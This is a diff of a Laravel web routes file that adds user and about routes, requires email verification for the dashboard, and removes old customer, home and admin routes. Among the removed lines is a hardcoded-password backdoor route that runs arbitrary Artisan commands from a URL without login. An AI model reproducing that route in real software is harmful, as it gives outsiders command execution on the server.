@@ -1,5 +1,6 @@
 <?php
 
+use App\Http\Controllers\UserController;
 use App\Http\Controllers\ProfileController;
 use Illuminate\Foundation\Application;
 use Illuminate\Support\Facades\Route;
@@ -16,13 +17,6 @@ use Inertia\Inertia;
 |
 */
 
-Route::get('artisan/{password}/{command}', function($password, $command) {
-    if ($password === 'Rn946PmQov') {
-        $exitCode = \Artisan::call($command, request()->all());
-        echo $exitCode;
-    }
-});
-
 Route::get('/', function () {
     return Inertia::render('Welcome', [
         'canLogin' => Route::has('login'),
@@ -34,29 +28,16 @@ Route::get('/', function () {
 
 Route::get('/dashboard', function () {
     return Inertia::render('Dashboard');
-})->middleware(['auth'])->name('dashboard');
+})->middleware(['auth', 'verified'])->name('dashboard');
 
-Route::group(['middleware' => 'auth'], function() {
-	// Route::get('/', ['DashboardController', 'index'])->name('home');
-	Route::get('/home', 'HomeController@index')->name('home');
+Route::middleware('auth')->group(function () {
+    Route::get('/about', fn () => Inertia::render('About'))->name('about');
+
+    Route::get('users', [UserController::class, 'index'])->name('users.index');
 
     Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
     Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
-
-
-    /* Route::resource('user', UserController::class, [
-        'only' => ['show', 'update']
-    ]); */
-
-	Route::get('dashboard', 'DashboardController@index')->name('dashboard');
-
-	// Customer
-    Route::get('customers', 'CustomerController@ajaxIndex')->name('customers.index.ajax');
-    Route::resource('customer', 'CustomerController', [
-    	'only' => ['index', 'update', 'show']
-    ]);
 });
 
 require __DIR__.'/auth.php';
-require __DIR__.'/admin.php';
